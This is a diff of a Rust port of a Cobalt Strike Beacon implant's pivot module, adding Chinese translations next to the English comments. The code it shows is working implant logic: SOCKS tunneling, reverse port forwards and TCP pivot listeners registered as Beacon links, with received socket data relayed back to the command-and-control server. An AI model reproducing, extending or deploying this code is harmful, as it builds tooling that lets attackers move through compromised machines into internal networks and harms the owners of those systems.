@@ -1,3 +1,4 @@
+//! Pivot（SOCKS / 端口转发 / TCP pivot）套接字管理（pivot.cpp）。
 //! Pivot (SOCKS / port forward / TCP pivot) socket management (pivot.cpp).
 
 use crate::bformat::FormatP;
@@ -24,6 +25,7 @@ const LISTEN_ONEOFF: u32 = 1;
 const LISTEN_PERSISTENT: u32 = 2;
 const LISTEN_TCPPIVOT: u32 = 3;
 
+/// pivot 套接字列表的一项（`socket_entry`）。
 /// One entry of the pivot socket list (`socket_entry`).
 #[derive(Clone, Copy)]
 struct SocketEntry {
@@ -37,16 +39,22 @@ struct SocketEntry {
     socket: usize,
 }
 
+/// pivot 套接字列表（pivot.cpp 的 `pivot_list`）。`pivot_poll_reaper()`
+/// 会清理此列表中的死项。
 /// The pivot socket list (pivot.cpp `pivot_list`). `pivot_poll_reaper()`
 /// cleans dead entries out of this list.
 static PIVOT_LIST: Mutex<Vec<SocketEntry>> = Mutex::new(Vec::new());
 
+/// 读取数据的共享缓冲区（pivot.cpp 的 `read_buffer`），惰性调整大小。
 /// Shared buffer for read data (pivot.cpp `read_buffer`), lazily sized.
 static READ_BUFFER: Mutex<Vec<u8>> = Mutex::new(Vec::new());
 
+/// 监听套接字 ID 池（pivot.cpp 的 `lsock_id`）。
 /// Listening socket ID pool (pivot.cpp `lsock_id`).
 static LSOCK_ID: AtomicU32 = AtomicU32::new(0);
 
+/// 精确接收 `len` 字节（recv_all）。出错时套接字被关闭（shutdown + close），
+/// 并返回 `SOCKET_ERROR`。
 /// Recv exactly `len` bytes (recv_all). On error the socket is shut down,
 /// closed, and `SOCKET_ERROR` is returned.
 fn recv_all(my_sock: usize, buffer: &mut [u8], len: usize) -> i32 {
@@ -65,6 +73,8 @@ fn recv_all(my_sock: usize, buffer: &mut [u8], len: usize) -> i32 {
     tret as i32
 }
 
+/// 把一个套接字添加到我们的套接字列表（_add_socket）。任何具有相同 id 的
+/// 现有项都会被作废（标记为 `STATE_DEAD`），然后新项被前插到列表。
 /// Add a socket to our list of sockets (_add_socket). Any existing entry
 /// with the same id is invalidated (marked `STATE_DEAD`), then the new
 /// entry is prepended.
@@ -90,11 +100,14 @@ fn _add_socket(socket: usize, id: u32, timeout: u32, ltype: u32, lport: u32, sta
     );
 }
 
+/// 添加一个正在连接的套接字（add_socket）。
 /// Add a connecting socket (add_socket).
 fn add_socket(socket: usize, id: u32, timeout: u32) {
     _add_socket(socket, id, timeout, LISTEN_NOTREALLY, 0, STATE_CONNECT);
 }
 
+/// 立即监听连接（generic_listen）。返回监听套接字（非阻塞、已绑定并监听）
+/// 或 `INVALID_SOCKET`。
 /// Listen for a connection now (generic_listen). Returns the listening
 /// socket (non-blocking, bound and listening) or `INVALID_SOCKET`.
 fn generic_listen(bindto: u32, port: u16, backlog: u32) -> usize {
@@ -110,6 +123,7 @@ fn generic_listen(bindto: u32, port: u16, backlog: u32) -> usize {
         sock.sin_port = htons(port);
         sock.sin_addr.S_un.S_addr = bindto;
 
+        // 把套接字设为非阻塞
         // make the SOCKET non-blocking
         let mut mode: u32 = 1;
         if ioctlsocket(my_sock, FIONBIO, &mut mode) == SOCKET_ERROR {
@@ -117,6 +131,7 @@ fn generic_listen(bindto: u32, port: u16, backlog: u32) -> usize {
             return INVALID_SOCKET;
         }
 
+        // 把它变成服务器
         // make it into a server
         if bind(
             my_sock,
@@ -128,6 +143,7 @@ fn generic_listen(bindto: u32, port: u16, backlog: u32) -> usize {
             return INVALID_SOCKET;
         }
 
+        // 监听连接…… *pHEAR*
         // listen for a connection... *pHEAR*
         if listen(my_sock, backlog as i32) == SOCKET_ERROR {
             closesocket(my_sock);
@@ -138,8 +154,11 @@ fn generic_listen(bindto: u32, port: u16, backlog: u32) -> usize {
     }
 }
 
+/// 立即监听连接（command_listen）。
 /// Listen for a connection now (command_listen).
 ///
+/// 线上格式：`[id : 4 字节][port : 2 字节]`。（本分支的 C++ 省略了
+/// `data_init` 调用；这里初始化解析器，以便像上游源码那样从缓冲区读取 id/port。）
 /// Wire format: `[id : 4 bytes][port : 2 bytes]`. (This fork's C++ omits
 /// the `data_init` call; the parser is initialized here so the id/port are
 /// read from the buffer as in the upstream source.)
@@ -158,22 +177,28 @@ pub fn command_listen(buffer: &[u8], length: usize, callback: Callback) {
     }
 }
 
+/// 尝试创建连接并保存起来供以后轮询（command_connect）。
 /// Attempt to create a connection and store it for polling later
 /// (command_connect).
 ///
+/// 线上格式：`[id : 4 字节][port : 2 字节][host : 其余部分]`。
 /// Wire format: `[id : 4 bytes][port : 2 bytes][host : the rest]`.
 pub fn command_connect(buffer: &[u8], length: usize, callback: Callback) {
+    // [id : 4 字节][port : 2 字节][host : 其余部分]
     // [id : 4 bytes][port : 2 bytes][host : the rest]
     if length < 6 {
         return;
     }
 
+    // 解析我们的 id 值（原始/网络字节序；fid 用于回调）
     // parse our id value (raw/network order; fid is used for callbacks)
     let id = u32::from_be_bytes([buffer[0], buffer[1], buffer[2], buffer[3]]);
 
+    // 解析我们的端口值
     // parse our port value
     let port = u16::from_be_bytes([buffer[4], buffer[5]]);
 
+    // 解析出主机值
     // parse out the host value
     let hlen = (length - 6).min(1023);
     let mut host = vec![0u8; hlen + 1];
@@ -188,6 +213,7 @@ pub fn command_connect(buffer: &[u8], length: usize, callback: Callback) {
             return;
         }
 
+        // 解析我们的目标
         // resolve our target
         let target = gethostbyname(host.as_ptr() as *const _);
         if target.is_null() {
@@ -196,6 +222,7 @@ pub fn command_connect(buffer: &[u8], length: usize, callback: Callback) {
             return;
         }
 
+        // 把我们的目标信息复制到 sock 中
         // copy our target information into the sock
         let mut sock: SOCKADDR_IN = std::mem::zeroed();
         let addr = *(*target).h_addr_list.offset(0) as *const u8;
@@ -207,6 +234,7 @@ pub fn command_connect(buffer: &[u8], length: usize, callback: Callback) {
         sock.sin_family = AF_INET as u16;
         sock.sin_port = htons(port);
 
+        // 把套接字设为非阻塞
         // make the SOCKET non-blocking
         let mut mode: u32 = 1;
         if ioctlsocket(my_sock, FIONBIO, &mut mode) == SOCKET_ERROR {
@@ -215,6 +243,7 @@ pub fn command_connect(buffer: &[u8], length: usize, callback: Callback) {
             return;
         }
 
+        // 发起我们的连接
         // issue our connection
         let status = connect(
             my_sock,
@@ -231,6 +260,8 @@ pub fn command_connect(buffer: &[u8], length: usize, callback: Callback) {
     }
 }
 
+/// 找出套接字何时准备好接收数据并发送它（send_helper）。
+/// 最多花约 30 秒尝试写出数据。
 /// Find out when the socket is ready for data and send it (send_helper).
 /// Spends at most ~30s trying to write the data out.
 fn send_helper(socket: usize, buffer: &[u8], length: usize) {
@@ -238,7 +269,7 @@ fn send_helper(socket: usize, buffer: &[u8], length: usize) {
         tv_sec: 0,
         tv_usec: 100,
     };
-    let timeout = unsafe { GetTickCount() } + 30000; // max of 30s to write out to socket
+    let timeout = unsafe { GetTickCount() } + 30000; // 最多 30 秒把数据写出到套接字 / max of 30s to write out to socket
 
     while unsafe { GetTickCount() } < timeout {
         let mut s_write = FD_SET::default();
@@ -256,6 +287,7 @@ fn send_helper(socket: usize, buffer: &[u8], length: usize) {
         } else if fd_isset(&s_write, socket) {
             let status = unsafe { send(socket, buffer.as_ptr() as *const _, length as i32, 0) };
             if status == SOCKET_ERROR && unsafe { WSAGetLastError() } == WSAEWOULDBLOCK {
+                // 我们应该稍后重试这个操作
                 // We should try this operation again in a little bit
                 unsafe { Sleep(1000) };
             } else {
@@ -265,6 +297,7 @@ fn send_helper(socket: usize, buffer: &[u8], length: usize) {
     }
 }
 
+/// 线上格式：`[id : 4 字节][data : 其余部分]`（command_send）。
 /// Wire format: `[id : 4 bytes][data : the rest]` (command_send).
 pub fn command_send(buffer: &[u8], length: usize) {
     if length < 4 {
@@ -272,6 +305,8 @@ pub fn command_send(buffer: &[u8], length: usize) {
     }
     let id = u32::from_be_bytes([buffer[0], buffer[1], buffer[2], buffer[3]]);
 
+    // 先收集匹配的套接字，这样在 `send_helper` 阻塞等待套接字可写时
+    // 我们不会持有列表锁。
     // Collect the matching sockets first so we don't hold the list lock
     // while `send_helper` blocks waiting for the socket to become writable.
     let targets: Vec<usize> = {
@@ -283,11 +318,13 @@ pub fn command_send(buffer: &[u8], length: usize) {
     };
 
     for socket in targets {
+        // 如果匹配，就发送数据
         // if we have a match, send the data
         send_helper(socket, &buffer[4..length], length - 4);
     }
 }
 
+/// 线上格式：`[id : 4 字节]`（command_close）。
 /// Wire format: `[id : 4 bytes]` (command_close).
 pub fn command_close(buffer: &[u8], length: usize) {
     if length < 4 {
@@ -297,10 +334,12 @@ pub fn command_close(buffer: &[u8], length: usize) {
 
     let mut list = PIVOT_LIST.lock();
     for entry in list.iter_mut() {
+        // 跳过死套接字
         // skip dead sockets
         if entry.state == STATE_DEAD {
             continue;
         }
+        // 如果匹配，就终止套接字
         // if we have a match, kill the socket
         if id == entry.id && entry.ltype != LISTEN_PERSISTENT {
             entry.state = STATE_DEAD;
@@ -308,19 +347,25 @@ pub fn command_close(buffer: &[u8], length: usize) {
     }
 }
 
+/// 下一个监听套接字 id（nextId）。
 /// Next listening socket id (nextId).
 fn next_id() -> u32 {
     let id = LSOCK_ID.fetch_add(1, Ordering::Relaxed);
     (id % 67108864) + 67108864
 }
 
+/// 检查现在已经连接好并可用的套接字（pivot_poll_checker）。
 /// Check for sockets that are now connected and ready to use
 /// (pivot_poll_checker).
 fn pivot_poll_checker(callback: Callback) {
+    // 由 LISTEN_PERSISTENT 监听器接受的套接字在遍历之后才添加
+    // （当前这一遍不能访问它们，这与 C 的列表前插 + `temp = temp->next`
+    // 遍历方式一致）。
     // Sockets accepted by a LISTEN_PERSISTENT listener are added after the
     // walk (they must not be visited by the current pass, matching the C
     // list prepend + `temp = temp->next` traversal).
     let mut pending_adds: Vec<(usize, u32, u32, u32, u32, u32)> = Vec::new();
+    // TCP pivot 接受的连接在遍历之后交给 link_register。
     // TCP pivot accepts are handed to link_register after the walk.
     let mut pending_links: Vec<(usize, u32)> = Vec::new();
 
@@ -333,6 +378,7 @@ fn pivot_poll_checker(callback: Callback) {
         let mut list = PIVOT_LIST.lock();
         let mut i = 0;
         while i < list.len() {
+            // 我们只处理正在等待连接的套接字
             // we only deal in sockets that are waiting to connect
             if list[i].state != STATE_CONNECT {
                 i += 1;
@@ -342,6 +388,7 @@ fn pivot_poll_checker(callback: Callback) {
             let fid = unsafe { htonl(list[i].id) };
             let sock = list[i].socket;
 
+            // 清空我们的集合并把套接字加进去
             // zero out our set and add the socket to it
             let mut s_write = FD_SET::default();
             let mut s_error = FD_SET::default();
@@ -350,28 +397,36 @@ fn pivot_poll_checker(callback: Callback) {
             fd_set(&mut s_error, sock);
             fd_set(&mut s_read, sock);
 
+            // 我们有连接了吗？
             // do we have a connection?
             unsafe {
                 select(0, &mut s_read, &mut s_write, &mut s_error, &tv);
             }
 
+            // 我们的反向端口转发之一
             // one of our reverse port forwards
             if list[i].ltype == LISTEN_PERSISTENT {
+                // 监听套接字准备好接受连接了
                 // a listening socket is ready to accept a connection
                 if fd_isset(&s_read, sock) {
-                    let mut mode: u32 = 1; // enable non-blocking I/O
+                    let mut mode: u32 = 1; // 启用非阻塞 I/O / enable non-blocking I/O
 
+                    // 接受连接
                     // accept the connection
                     let lsock = unsafe { accept(sock, std::ptr::null_mut(), std::ptr::null_mut()) };
 
+                    // 把套接字设为非阻塞模式并继续……
                     // put the socket into non-blocking mode and continue on...
                     if unsafe { ioctlsocket(lsock, FIONBIO, &mut mode) } != SOCKET_ERROR {
+                        // 给它分配一个 id
                         // assign an id to it
                         let newfid = next_id();
 
+                        // 以 STATE_READ 状态注册这个套接字
                         // register this socket with STATE_READ
                         pending_adds.push((lsock, newfid, 180000, LISTEN_NOTREALLY, 0, STATE_READ));
 
+                        // 让控制器知道我们有一个新连接
                         // let the controller know we have a new connection
                         let mut result = FormatP::init(128);
                         result.bformat_int(newfid as i32);
@@ -379,61 +434,76 @@ fn pivot_poll_checker(callback: Callback) {
                         let blen = result.bformat_length();
                         callback(result.bformat_string(), blen as i32, CALLBACK_ACCEPT);
                     } else {
+                        // 如果未能切换到非阻塞模式，就关闭套接字
                         // if we failed to go to non-blocking mode, close the socket
                         unsafe {
                             closesocket(lsock);
                         }
-                        break; // C: return -- abort the whole checker walk
+                        break; // C: return —— 中止整个检查器遍历 / C: return -- abort the whole checker walk
                     }
                 }
             }
+            // 一个 TCP pivot。:)
             // a TCP pivot. :)
             else if list[i].ltype == LISTEN_TCPPIVOT {
+                // 监听套接字准备好接受连接了
                 // a listening socket is ready to accept a connection
                 if fd_isset(&s_read, sock) {
+                    // 接受连接
                     // accept the connection
                     let lsock = unsafe { accept(sock, std::ptr::null_mut(), std::ptr::null_mut()) };
 
+                    // 请把它注册为命名管道 Beacon
                     // register this as a named pipe Beacon, please
                     pending_links.push((lsock, list[i].lport));
                 }
             }
+            // 对 SOCKS 套接字区别对待……谢谢！
             // treat SOCKS sockets differently... thanks!
             else {
+                // 套接字死了吗？
                 // is the socket dead?
                 if fd_isset(&s_error, sock) {
                     list[i].state = STATE_DEAD;
                     callback(&fid.to_ne_bytes(), 4, CALLBACK_CLOSE);
                 }
+                // 套接字还活着并且准备好写入了吗？
                 // is the socket alive and ready to write to?
                 else if fd_isset(&s_write, sock) {
                     list[i].state = STATE_READ;
                     callback(&fid.to_ne_bytes(), 4, CALLBACK_CONNECT);
                 }
+                // 监听套接字准备好接受连接了
                 // a listening socket is ready to accept a connection
                 else if fd_isset(&s_read, sock) {
+                    // 保存监听套接字
                     // store the listening socket
                     let lsock = list[i].socket;
 
+                    // 接受连接
                     // accept the connection
                     let acc = unsafe { accept(lsock, std::ptr::null_mut(), std::ptr::null_mut()) };
 
                     if acc == INVALID_SOCKET {
+                        // 如果出了问题，把它报告为失败
                         // if something went wrong, report it as a failure
                         list[i].state = STATE_DEAD;
                         callback(&fid.to_ne_bytes(), 4, CALLBACK_CLOSE);
                     } else {
+                        // 否则，我们准备好大干一场，开始吧！
                         // otherwise, we're ready to rock, let's do it!
                         list[i].state = STATE_READ;
                         list[i].socket = acc;
                         callback(&fid.to_ne_bytes(), 4, CALLBACK_CONNECT);
                     }
 
+                    // 关闭监听套接字，我们不再需要它了
                     // close the listening socket, we don't need it anymore
                     unsafe {
                         closesocket(lsock);
                     }
                 }
+                // 这个套接字死了，或者我们反正也不等它了
                 // this socket is dead, or we're not waiting for it anyways
                 else if (unsafe { GetTickCount() } - list[i].start) > list[i].timeout {
                     list[i].state = STATE_DEAD;
@@ -453,6 +523,8 @@ fn pivot_poll_checker(callback: Callback) {
     }
 }
 
+/// 从我们的列表中清理死套接字（pivot_poll_reaper）。套接字在标记为死后
+/// 1 秒才被终止，以允许未发送的数据发出去。
 /// Clean up dead sockets from our list (pivot_poll_reaper). Sockets are
 /// killed 1s after being marked dead, to allow any unsent data to get out.
 fn pivot_poll_reaper(_callback: Callback) {
@@ -467,11 +539,13 @@ fn pivot_poll_reaper(_callback: Callback) {
             prev = Some(i);
             i += 1;
         }
+        // 1 秒后终止套接字……以便未发送的数据能够发送出去
         // kill sockets after 1s... to allow any unsent data to get sent please
         else if state == STATE_DEAD && (unsafe { GetTickCount() } - list[i].linger) > 1000 {
             let ltype = list[i].ltype;
             let sock = list[i].socket;
 
+            // 关闭套接字
             // shutdown the socket
             if ltype == LISTEN_NOTREALLY {
                 unsafe {
@@ -479,6 +553,7 @@ fn pivot_poll_reaper(_callback: Callback) {
                 }
             }
 
+            // 在套接字真正死亡之前不要放掉这个项。谢谢！
             // do not let go of this item until socket is really dead. Thanks!
             if unsafe { closesocket(sock) } != 0 && ltype == LISTEN_PERSISTENT {
                 prev = Some(i);
@@ -486,16 +561,18 @@ fn pivot_poll_reaper(_callback: Callback) {
                 continue;
             }
 
+            // 把套接字从我们的列表中摘除
             // unlink the socket from our list
             match prev {
                 None => {
+                    // C: temp = NULL —— 移除头部后遍历结束
                     // C: temp = NULL -- the walk ends after removing the head
                     list.remove(i);
                     break;
                 }
                 Some(p) => {
                     list.remove(i);
-                    i = p + 1; // temp = prev->next
+                    i = p + 1; // 继续遍历：temp = prev->next / temp = prev->next
                 }
             }
         } else {
@@ -505,9 +582,11 @@ fn pivot_poll_reaper(_callback: Callback) {
     }
 }
 
+/// 检查准备好读取的套接字（pivot_poll_reader）。返回成功读取的次数。
 /// Check for sockets ready to be read from (pivot_poll_reader). Returns
 /// the number of successful reads.
 fn pivot_poll_reader(callback: Callback) -> i32 {
+    // 分配我们的读缓冲区，拜托了
     // allocate our read buffer plz
     let mut rb = READ_BUFFER.lock();
     if rb.len() < SOCKET_READ_MAX {
@@ -518,40 +597,49 @@ fn pivot_poll_reader(callback: Callback) -> i32 {
     let mut list = PIVOT_LIST.lock();
     let mut i = 0;
     while i < list.len() {
+        // 如果套接字死了，就移到下一项
         // if the socket is dead, go to the next item
         if list[i].state != STATE_READ {
             i += 1;
             continue;
         }
 
+        // 修正 id，并把连接 id 复制到缓冲区开头
         // fix the id and copy the connection id to the beginning of the buffer
         let fid = unsafe { htonl(list[i].id) };
         rb[..4].copy_from_slice(&fid.to_ne_bytes());
 
+        // 有多少字节可读？
         // how many bytes are available for reading?
         let mut count: u32 = 0;
         let status = unsafe { ioctlsocket(list[i].socket, FIONREAD, &mut count) };
 
+        // 我们有固定缓冲区，别做得太过
         // we have a fixed buffer, let's not overdo it
         if count > (SOCKET_READ_MAX - 4) as u32 {
             count = (SOCKET_READ_MAX - 4) as u32;
         }
 
+        // 出错了？终止我们的套接字！
         // did an error occur? kill our socket!
         if status == SOCKET_ERROR {
             list[i].state = STATE_DEAD;
             callback(&rb[..4], 4, CALLBACK_CLOSE);
         } else if count > 0 {
+            // 读取我们的数据，拜托
             // read in our data, plz
             let ret = recv_all(list[i].socket, &mut rb[4..4 + count as usize], count as usize);
 
+            // 出问题了？真的吗？
             // something went wrong? seriously?
             if ret == SOCKET_ERROR {
                 list[i].state = STATE_DEAD;
                 callback(&rb[..4], 4, CALLBACK_CLOSE);
             }
+            // 好了，一切正常……
             // ok, we're all good...
             else if ret == count as i32 {
+                // 发布数据，拜托
                 // post the data plz
                 callback(&rb[..4 + count as usize], (4 + count) as i32, CALLBACK_READ);
                 read += 1;
@@ -563,17 +651,23 @@ fn pivot_poll_reader(callback: Callback) -> i32 {
     read
 }
 
+/// 轮询我们所有的套接字，看看有没有可读的内容，读取它，
+/// 并把所有内容发布回 Cobalt Strike（pivot_poll）。
 /// Poll all of our sockets, see if there's anything to be read, read it,
 /// and post it all back to Cobalt Strike (pivot_poll).
 pub fn pivot_poll(callback: Callback) {
+    // 检查连接
     // check for connections
     pivot_poll_checker(callback);
 
+    // 我们只允许读取阻塞 3.5 秒……使用 HTTP POST C2 时我们永远不会碰到这个，
+    // 但在 GET ONLY 和 DNS 下，持续的读取可能会饿死其他一切
     // we are only going to allow reads to block for 3.5s... with HTTP POST C2
     // we'll never hit this, but with GET ONLY and DNS it's a risk that ongoing
     // reads can starve everything else
     let stopat = unsafe { GetTickCount() } + 3500;
 
+    // 只要有数据可读就继续读取，拜托
     // keep reading while we have data to read please
     loop {
         let read = pivot_poll_reader(callback);
@@ -582,10 +676,12 @@ pub fn pivot_poll(callback: Callback) {
         }
     }
 
+    // 清理任何死套接字
     // clean up any dead sockets
     pivot_poll_reaper(callback);
 }
 
+/// 这个端口是否已经被持久监听器绑定？（is_bound）
 /// Is this port already bound by a persistent listener? (is_bound)
 fn is_bound(port: u16) -> bool {
     let list = PIVOT_LIST.lock();
@@ -597,19 +693,23 @@ fn is_bound(port: u16) -> bool {
     false
 }
 
+/// 绑定一个套接字（command_socket_bind）。线上格式：`[port : 2 字节]`。
 /// Bind a socket (command_socket_bind). Wire format: `[port : 2 bytes]`.
 pub fn command_socket_bind(buffer: &[u8], length: usize, bindto: u32) {
     let mut parser = DataP::init(&mut buffer[..length.min(buffer.len())].to_vec());
     let port = parser.data_short();
 
+    // 如果已经在这里绑定并管理……什么都不做
     // if we're already bound and managed here... do nothing
     if is_bound(port) {
         return;
     }
 
+    // 设置我们的监听套接字
     // setup our listening socket
     let my_sock = generic_listen(bindto, port, 10);
 
+    // 套接字就绪时处理它
     // process the socket when it's up
     if my_sock != INVALID_SOCKET {
         _add_socket(my_sock, next_id(), 0, LISTEN_PERSISTENT, port as u32, STATE_CONNECT);
@@ -618,14 +718,17 @@ pub fn command_socket_bind(buffer: &[u8], length: usize, bindto: u32) {
     }
 }
 
+/// 绑定一个套接字（command_socket_tcppivot）。线上格式：`[port : 2 字节]`。
 /// Bind a socket (command_socket_tcppivot). Wire format: `[port : 2 bytes]`.
 pub fn command_socket_tcppivot(buffer: &[u8], length: usize) {
     let mut parser = DataP::init(&mut buffer[..length.min(buffer.len())].to_vec());
     let port = parser.data_short();
 
+    // 设置我们的监听套接字
     // setup our listening socket
     let my_sock = generic_listen(INADDR_ANY, port, 10);
 
+    // 套接字就绪时处理它
     // process the socket when it's up
     if my_sock != INVALID_SOCKET {
         _add_socket(my_sock, next_id(), 0, LISTEN_TCPPIVOT, port as u32, STATE_CONNECT);
@@ -634,6 +737,7 @@ pub fn command_socket_tcppivot(buffer: &[u8], length: usize) {
     }
 }
 
+/// 关闭一个已绑定的套接字（command_socket_close）。线上格式：`[port : 2 字节]`。
 /// Close a bound socket (command_socket_close). Wire format: `[port : 2 bytes]`.
 pub fn command_socket_close(buffer: &[u8], length: usize) {
     let mut parser = DataP::init(&mut buffer[..length.min(buffer.len())].to_vec());
@@ -641,11 +745,13 @@ pub fn command_socket_close(buffer: &[u8], length: usize) {
 
     let mut list = PIVOT_LIST.lock();
     for entry in list.iter_mut() {
+        // 跳过死套接字
         // skip dead sockets
         if entry.state == STATE_DEAD {
             continue;
         }
 
+        // 如果匹配，就终止套接字
         // if we have a match, kill the socket
         if entry.ltype == LISTEN_PERSISTENT && entry.lport == port as u32 {
             entry.state = STATE_DEAD;
@@ -655,6 +761,7 @@ pub fn command_socket_close(buffer: &[u8], length: usize) {
     }
 }
 
+/// FD_SET（windows-sys 没有宏；FD_SET::default() 已经清零）
 /// FD_SET (windows-sys has no macro; FD_SET::default() already zeroes)
 fn fd_set(set: &mut FD_SET, fd: usize) {
     if (set.fd_count as usize) < set.fd_array.len() {
